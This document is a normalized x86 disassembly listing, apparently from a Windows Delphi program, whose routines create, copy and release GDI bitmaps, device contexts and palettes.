call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ebb7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eb9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407b14
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eba1
mov al 0x1
sub_41ebd0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4158a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ec18
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec1f
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_41ec24
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41ec58
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_4158a0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41eca3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ecaa
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_41ed6c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413b18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ee0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee11
mov eax [ rw-data ]
call sub_413b7c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_41ede2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_41eefc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d330
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4137ac
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d2d4
test al al
je r-xdata
sub_41ee18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_413b18
mov esi eax
xor ecx ecx
push ebp
push sub_41ee88
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413b7c
retn
mov edx ebx
mov eax esi
call sub_4137ac
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_41eefc
sub_41ee94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41cb00
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41eed0
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_41eefc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cbc4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41eefc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d0c4
xor edx edx
push ebp
push sub_41ef90
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d4b8
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413b2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d330
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_41ef9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_41f07b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4202b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_41ee18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_420498
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d4b8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_413a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d330
retn
sub_41f08c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403258
sub_41f0ac
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_41ee18
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40cb64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_41f108
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41b454
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_41ee18
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_41ee18
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_41f154
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41dfb8
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f203
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41f210
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_41f25c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee18
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41d824
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_41f8aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026bc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_41f5b4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41d710
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41d824
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41d824
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d824
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41d824
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41f85b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41f84a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41f828
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41d824
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_41f210
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41dfb8
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9e4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412378
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41d77c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f82f
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_41f7fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d824
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd24
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
call sub_41bd24
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd24
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9a8
call sub_41bd24
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a78
call sub_403a78
jmp r-xdata
sub_41f851
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f860
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039f4
call sub_403a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f8c0
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_41f924
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_41ee18
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41fb1f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41d824
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d824
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fad7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_41f25c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_41fb30
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e98c
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f088
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_41fb98
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_4202a8
mov eax [ esi + 0x28 ]
call sub_41f08c
mov eax [ esi + 0x2c ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413d24
